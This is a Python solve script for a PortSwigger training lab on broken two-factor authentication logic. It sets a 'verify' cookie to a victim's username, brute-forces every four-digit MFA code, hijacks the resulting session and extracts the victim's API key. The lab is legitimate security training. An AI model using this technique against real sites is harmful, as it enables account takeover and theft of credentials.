#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
2FA broken logic.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf(session, url):
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def main():
    parser = argparse.ArgumentParser(description="Solve Auth Lab 8 (2FA broken logic)")
    parser.add_argument("lab_url")
    parser.add_argument("--victim", default="carlos")
    args = parser.parse_args()
    lab = args.lab_url.rstrip("/")

    s = requests.Session()
    s.verify = False

    csrf = get_csrf(s, f"{lab}/login")
    s.post(f"{lab}/login", data={"csrf": csrf, "username": "wiener", "password": "peter"})

    s.get(f"{lab}/login2", cookies={"verify": args.victim})
    s.cookies.set("verify", args.victim)

    print(f"[*] Brute-forcing MFA code for {args.victim}...")
    for code in range(10000):
        mfa = f"{code:04d}"
        csrf = get_csrf(s, f"{lab}/login2")
        r = s.post(
            f"{lab}/login2",
            data={"csrf": csrf, "mfa-code": mfa},
            cookies={"verify": args.victim},
            allow_redirects=False
        )
        if r.status_code == 302:
            print(f"[+] Valid MFA code: {mfa}")
            session_cookie = r.cookies.get("session")
            s2 = requests.Session()
            s2.verify = False
            s2.cookies.set("session", session_cookie)
            account = s2.get(f"{lab}/my-account")
            m = re.search(r"Your API Key is: ([^<]+)", account.text)
            if m:
                print(f"[+] API Key: {m.group(1).strip()}")
            print("[+] Lab solved.")
            return

    print("[-] MFA code not found in 0000-9999")


if __name__ == "__main__":
    main()
